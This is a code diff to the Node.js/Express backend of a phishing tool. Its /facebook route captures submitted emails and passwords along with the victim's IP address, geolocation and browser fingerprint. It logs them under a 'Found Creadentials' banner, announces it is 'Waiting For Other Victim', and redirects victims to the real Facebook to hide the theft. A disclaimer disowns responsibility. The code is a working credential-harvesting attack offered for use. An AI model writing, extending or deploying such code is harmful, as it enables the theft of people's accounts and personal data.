@@ -1,5 +1,4 @@
 const express = require("express");
-const os = require("os");
 const app = express();
 const geoip = require("geoip-lite"); // npm install --save geoip-lite
 const Sniffr = require("sniffr"); // npm install --save sniffr
@@ -18,25 +17,36 @@ app.post("/facebook", (req, res) => {
   const email = req.body.email;
   const password = req.body.password;
   const userAgent = req.headers["user-agent"];
-  const s = new Sniffr();
-  s.sniff(userAgent);
+  const startSniff = new Sniffr();
+
+  startSniff.sniff(userAgent);
+
   const clientIp = requestIp.getClientIp(req);
   const geo = geoip.lookup(clientIp); // will be set to null if server is accessed locally
+
   res.statusCode = 200;
   res.setHeader("Content-Type", "application/json");
+
   console.log(
-    "<===========================================================================>",
+    `
+    
+    """"""""""""""""""""""""""" Found Creadentials """""""""""""""""""""""""""""""""
+    
+    `,
     JSON.stringify(
       {
         email,
         password,
-        ...s,
+        ...startSniff,
         clientIp,
         geo
       },
       null,
       2
     )
+  );
+  console.log(
+    `""""""""""""""""""""""""""" Waiting For Other Victim """""""""""""""""""""""""""""""""`
   );
 
   return res.redirect("http://www.facebook.com");
@@ -52,7 +62,6 @@ app.listen(PORT, HOST, err => {
   | | | | (_) | (_| |  __| |_) | | | | \__ | | | |  __| |
   |_| |_|\___/ \__,_|\___| .__/|_| |_|_|___|_| |_|\___|_|
                          |_|
- 
 
   Disclaimer: i'm not responsible for any of your Actions.
   
